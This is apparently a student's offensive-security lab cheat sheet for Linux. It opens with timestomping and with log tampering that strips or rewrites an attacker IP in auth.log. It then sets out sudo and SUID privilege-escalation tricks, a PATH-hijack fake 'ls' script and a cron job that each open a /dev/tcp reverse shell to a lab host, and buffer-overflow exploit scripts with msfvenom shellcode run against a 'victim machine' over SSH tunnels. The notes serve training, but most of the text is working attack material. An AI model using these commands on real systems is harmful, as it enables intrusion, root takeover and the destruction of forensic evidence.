Timestomp (Nix)
Easy with Nix vs Windows (Native change of Access & Modify times)
touch -c -t 201603051015 1.txt   # Explicit
touch -r 3.txt 1.txt    # Reference
Changing the change time requires changing the system time than touch the file. Could cause serious issues!
￼
touch -r  extraction hijackmeplz.dll  (hijackmeplz will have the same times than extraction)

￼
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Cleaning The Logs (Precise)Always work off a backup! GREP (Remove)egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2 SED (Replace)cat auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' auth.log2; cat auth.log2 > auth.log

REMOTE LOGIN FILES:
/etc/rsyslog.d/*	-	Newer systems 
/etc/rsyslog.conf      -       Older systems 
grep "IncludeConfig" /etc/rsyslog.conf


Facility is the type of Rsyslog messages that we are going to receive  (eg: kern.* all kernel messages all severities)
Priority is going to be the severity of it (critical,...)

Rsyslog Examples
kern.*                                                # All kernel messages, all severities
mail.crit
cron.!info,!debug
*.*  @192.168.10.254:514                                                    # Old format
*.* action(type="omfwd" target="192.168.10.254" port="514" protocol="udp")   # New format
#mail.*






/etc/shadow
/etc/password

example to get access to sudo 
sudo vim /etc/ssh/sshd_config 
:!/bin/bash

sudo find / -name "whatever" 

GTFOBins - visit this website to find different ways to break out of the established environment.
Crontab Guru 


Linux opstation sudoers file.

find / -type f -perm /4000 -ls 2>/dev/null #Find SUID only files.
find / -type f -perm /2000 -ls 2>/dev/null #Find SGID only files.
find / -type f -perm /6000 -ls 2>/dev/null #Find SUID/SGID files.

crontab -l 
crontab -e (create/edit crontab)
crontab -r (remove crontab)
crontab -u <user> -l 
sudo ls -l /var/spool/cron/crontabs
cat /etc/crontab

/etc/cron.daily
/etc/cron.hourly - Be familiar with the different files that have to be present in this directories. Linux people can be very autistic when it comes to naming files.


World-Writable Files and Folders
/tmp
/var/tmp
find / -type d -perm /2 -ls 2>/dev/null





```
DEMO:


1.SUDO MISSCONFIGURATIONS.
sudo -l
sudo apt-get changelog apt
!/bin/sh

information from a pager, the last pager is the default one. From the last page we get a shell and we will be able to run commands as root (# root $ User)
<id> to confirm


2.SUDO MISCONFIGURATIONS.
sudo -l 
sudo -l /var/log/syslog*

it allows to concatenate any command. 

sudo cat /var/log/syslog /etc/shadow 
which john just to see that is installed 


3. 
find / -type f -perm /6000 -ls 2>/dev/null
cat /etc/shadow


we are ignoring sudo install -m =xs $(which nice) . ./ because the binary already has vulnerable permissions. 

we run <nice /bin/sh -p>

if it shows that euid=0(root) it means that my effective user id shows that I am root 




There is a user on the system with the ability to sudo certain programs that has a '.' dot in their path and is navigating to and listing the contents of common world writable directories approximately every five minutes.

The user's script is running like this:

cd `printf "/var/tmp\n/tmp\n"|sort -R | head -n 1`;ls
The flag is located in this users home directory.




MCNUTS: In this particular case the most advantage that can be taken out of the command ran by user BillyBob is to obtain the path to a shell as it follows.
```
```
----------Create this script and call it ls---------------
#!/bin/bash
# script that sends information to a remote system.


/bin/bash -i > /dev/tcp/10.10.0.40/9999 0<&1 2>&1
-----------------------------------------------------

So when Billy calls the command ls having him a . on his path our ls script will be run

After that we create a listener on our box to get that interactive shell path 

$ nc -lvnp 9999

type /bin/ls or id to ac


-----------------------------------------------------------------------------------------------
```
```
ESCALATING PRIVILEGES THROUGH SUID:


find / -type f -perm /6000 -ls 2>/dev/null

After locating the binery that exposes the system to a vulnerability to escalate privileges
determine what this binary does. In this particular example it appends text to a file.
The possibility that it offers is that it can apppend text to the sudoers file with root privileges
Therefore we check the sudoers file on our lin-ops where we have root privileges and copy the 
exact same format in order to append it to the sudoers file substituting root for comrade (our username)

./unknown 'comrade ALL=(ALL:ALL) ALL' single quotes are needed and the command will run sequentianly 

./unknown is the name of our binary. 


USE CRONTAB TO SEND FROM MY BOX TO A LISTENER
vim crontab 
* * * * * root /bin/bash -i > /dev/tcp/192.168.28.135/33403 0<&1 2>&1 
---------------------------------------------------------------------------------------------------------------
```
```
# RSYSLOG.CONF
#  /etc/rsyslog.conf	Configuration file for rsyslog.
#
#			For more information see
#			/usr/share/doc/rsyslog-doc/html/rsyslog_conf.html


#################
#### MODULES ####
#################

module(load="imuxsock") # provides support for local system logging
module(load="imklog")   # provides kernel logging support
#module(load="immark")  # provides --MARK-- message capability

# provides UDP syslog reception
#module(load="imudp")
#input(type="imudp" port="514")

# provides TCP syslog reception
#module(load="imtcp")
#input(type="imtcp" port="514")


###########################
#### GLOBAL DIRECTIVES ####
###########################

#
# Use traditional timestamp format.
# To enable high precision timestamps, comment out the following line.
#
$ActionFileDefaultTemplate RSYSLOG_TraditionalFileFormat

#
# Set the default permissions for all log files.
#
$FileOwner root
$FileGroup adm
$FileCreateMode 0640
$DirCreateMode 0755
$Umask 0022

#
# Where to place spool and state files
#
$WorkDirectory /var/spool/rsyslog

#
# Include all config files in /etc/rsyslog.d/
#
$IncludeConfig /etc/rsyslog.d/*.conf


###############
#### RULES ####
###############
```

# First some standard log files.  Log by facility.

```
#
#auth,authpriv.*		/var/log/auth.log
#*.*;auth,authpriv.none		-/var/log/syslog
#cron.*				/var/log/cron.log
daemon.*			-/var/log/daemon.log
#ftp.!debug,!alert,emerg        -/var/tmp/ftp.log
#0.*				-/var/log/kern.log
local7.alert		        /var/tmp/boot.log
#lpr.*				-/var/log/lpr.log
mail.*				-/var/log/mail.log
1.!crit,!debug,emerg,!info   -/var/log/user.log
#
#
#
mail.info			-/var/log/mail.info
2.warn			-/var/log/mail.warn
mail.err			/var/log/mail.err
#
#
*.=debug;\
	auth,authpriv.none;\
	news.none;mail.none	-/var/log/debug
*.=info;*.=notice;*.=warn;\
	auth,authpriv.none;\
	cron,daemon.none;\
	mail,news.none		-/var/log/messages

#
*.emerg				:omusrmsg:*

# *.*       @@192.0.2.1:13232
*.* action(type="omfwd" target="193.0.12.1" port="10514" protocol="udp")
#*.* action(type="omfwd" target="192.0.42.1" port="1514" protocol="udp")
```


Exploitation Development
Linux Exploitation Buffer Overflow
GDB Uses

disass <FUNCTION>   #   Disassemble portion of the program
info <...>  #   Supply info for specific stack areas
x/256c $<REGISTER>  #   Read characters from specific register
break <address>  #   Establish a break point
pdisass main  # breaks up the main function
run function in gdb

make pythin script to find the EIP point in the buffer

#!/user/bin/env python
 buffer = "A" * 62
 eip = "BBBB"
  
 print(buffer+eip)
gbd-peda$ run <<<$(python Linbuff.py)

https://wiremask.eu/tools/buffer-overflow-pattern-generator/

env - gdb ./func    # gives a clean copy of the gdb 
(gdb) show env
LINES=27
COLUMNS=101
(gdb) unset env lines
(gdb) unset env columns
run functions and input manual overflow, get segmentation fault

info proc map
Find the first hex value right after the heap to the end of the stack to get the stack

(gdb) find /b 0xfde1000, 0xffffe000, 0xff, 0xe4
grab 4 addresses, flip them to little endian

#!/user/bin/env python
  
  
  #stack is in between 0xf7de1000 and 0xffffe000
  
  #0xf7de3b59 -> 0xf7 de 3b 59 -> "\x59\x3b\xde\xf7"
  #0xf7f588ab -> 0xf7 f5 88 ab -> "\xab\x88\xf5\xf7"
  #0xf7f645fb -> 0xf7 f6 45 fb -> "\xfb\x45\xf6\xf7"
  #0xf7f6460f -> 0xf7 f6 46 0f -> "\x0f\x46\xf6\xf7"
  
  
  buffer = "A" * 62
  eip = "BBBB"
  
  
  print(buffer+eip)
  
make a new window and create a msfvenom payload, if it doesnt work try to generate another one

msfvenom -p /linux/x86/exec CMD=whoami -b '\x00' -f python
copy shellcode into to python script then add nop varaible

 #!/user/bin/env python
   
   
  #stack is in between 0xf7de1000 and 0xffffe000
  
  #0xf7de3b59 -> 0xf7 de 3b 59 -> "\x59\x3b\xde\xf7"
  #0xf7f588ab -> 0xf7 f5 88 ab -> "\xab\x88\xf5\xf7"
  #0xf7f645fb -> 0xf7 f6 45 fb -> "\xfb\x45\xf6\xf7"
  #0xf7f6460f -> 0xf7 f6 46 0f -> "\x0f\x46\xf6\xf7"
  
  
  buffer = "A" * 62
  eip = "\x59\x3b\xde\xf7"
  
  nop = "\x90" * 15
  
  buf =  b""
  buf += b"\xd9\xf6\xd9\x74\x24\xf4\x5e\x33\xc9\xb1\x0a\xbd"
  buf += b"\x25\x84\x0f\x24\x31\x6e\x19\x03\x6e\x19\x83\xc6"
  buf += b"\x04\xc7\x71\x65\x2f\x5f\xe3\x28\x49\x37\x3e\xae"
  buf += b"\x1c\x20\x28\x1f\x6c\xc6\xa9\x37\xbd\x74\xc3\xa9"
  buf += b"\x48\x9b\x41\xde\x48\x5b\x66\x1e\x26\x3f\x66\x49"
  buf += b"\xeb\x36\x87\xb8\x8b"
  
  print(buffer+eip+nop+buf)
execute the script.

./func <<<$(python linbuffer.py)

```
file func
strings func 
chmod u+x func

gdb ./func
run <<<$(echo "asdfasdfasdfasdf")
info functions
pdisass main
-> pdisass getuserinput

https://wiremask.eu/tools/buffer-overflow-pattern-generator/
use script to find where overflow occurs

run <<<$(python buff.py)

env - gdb ./func   -  (Ener without peda plugin)
show env
usnet env COLUMNS
unset env LINES

run 
AAAAAAAAAAAAAAAAAAAAAAaa
OVERFLOW

info proc map
** Take note of first start address after HEAP and End Address of STACK **
find /b 0xf7def000, 0xffffe000, 0xff ,0xe4
** 0xff is jump, 0xe4 ESP **
** Grab First Four Addresses from OutPut
** Break down -> each byte and reverse in ""
#0xf7de3b59 -> 0xf7 de 3b 59 "\x59\x3b\xde\xf7"
#0xf7f588ab -> 0xf7 f5 88 ab "\xab\x88\xf5\xf7"
#0xf7f645fb -> 0xf7 f6 45 fb "\xfb\x45\xf6\xf7"
#0xf7f6460f -> 0xf7 f5 46 0f "\x0f\x46\xf5\xf7"

** Copy one of the reverse codes in "" and put in eip ""
** In terminal run msfvenom **
msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python 
** COPY SHELL CODE  into script **

msfvenom --list payloads   
Python Script
#!/usr/bin/env python
 buffer = "A" * 100
 eip = "BBBB"

#stack is inbetween 0xf7de1000 and 0xffffe0000
#0xf7de3b59 -> 0xf7 de 3b 59 "\x59\x3b\xde\xf7"
#0xf7f588ab -> 0xf7 f5 88 ab "\xab\x88\xf5\xf7"
#0xf7f645fb -> 0xf7 f6 45 fb "\xfb\x45\xf6\xf7"
#0xf7f6460f -> 0xf7 f5 46 0f "\x0f\x46\xf5\xf7"

buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"

nop = "\x90" * 15
buf =  b""
buf += b"\xd9\xc2\xb8\x21\xce\x96\x0f\xd9\x74\x24\xf4\x5b"
buf += b"\x29\xc9\xb1\x0a\x31\x43\x19\x03\x43\x19\x83\xc3"
buf += b"\x04\xc3\x3b\xfc\x04\x5b\x5d\x53\x7d\x33\x70\x37"
buf += b"\x08\x24\xe2\x98\x79\xc2\xf3\x8e\x52\x70\x9d\x20"
buf += b"\x24\x97\x0f\x55\x35\x57\xb0\xa5\x53\x33\xb0\xf2"
buf += b"\xf0\x32\x51\x31\x76"
print(buffer+buf+nop+eip)
```
```
file inventory.exe
strings inventory.exe

gdb ./inventory.exe
run
info functions
info functions main

pdisass main
>    0x0804855e <+27>:  call   0x80484d6 <getTheGoods>
 
pdisass getTheGoods
 
0x080484f2 <+28>:  call   0x8048360 <printf@plt>
***  0x0804850f <+57>:  call   0x8048370 <fgets@plt>
 
https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
#Generate Pattern and Insert Pattern into script

run <<<$(python buff.py)
#Check EIP for Register Value
#Set offset as part of A * Buffer

#See Where Stack Starts and Ends by checking Start Address imm
 ediately following Heap and End Address on Stack
info proc map

#Switch to peda free gdb
env - gdb ./inventory.exe
unset env COLUMNS
unset env LINES
run
 #Overflow manually
 AAAAAAAAAAAAAAAAAAAAAAAAAAA-----
  
 find /b 0xf7de1000, 0xffffe000, 0xff ,0xe4
 ** Grab First Four Addresses from OutPut
 # Convert Memory Address to Little Endian
 ** Copy one of the reverse codes in "" and put in eip ""
 0xf7de3b59 -> "\x59 \x3b \xde \xf7"
 0xf7f588ab -> "\xab \x88 \xf5 \xf7"
 0xf7f645fb -> "\xfb \x45 \xf6 \xf7"
 0xf7f6460f -> "\x0f \x46 \xf6 \xf7"
 
 msfconsole 
 use payload /linux/x86/exec
 set CMD cat users
 generate -b "\x00" -f python
 
 #Take buf payload and input into script
 ** Copy one of the reverse codes in "" and put in eip "" if no
  t done
 # Troubleshoot script until it executes
 gdb ./inventory.exe

 run <<<#(python buff.py)
 #Restart Process and Generate Mem Addresses for victim machine
 ssh -S /tmp/jump dum -O forward -L 5152:192.168.28.111:2222
 ssh comrade@localhost -p 5152
 
 cd /
 ls -lisa
 cd .hidden
 gdb ./inventory.exe
 unset env LINES
 unset env COLUMNS
 
 run
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 #Manual Overflow
 find /b 0xf7def000, 0xffffe000, 0xff ,0xe4
 0xf7df1b51 -> "\x51\x1b\xdf\xf7"
 
 # Change CMD with payload to match command needed
 # scp script to victim machine
 scp -P 5152 buff.py comrade@localhost:.
 sudo ./inventory.exe <<<$(python /home/comrade/buff.py)
```


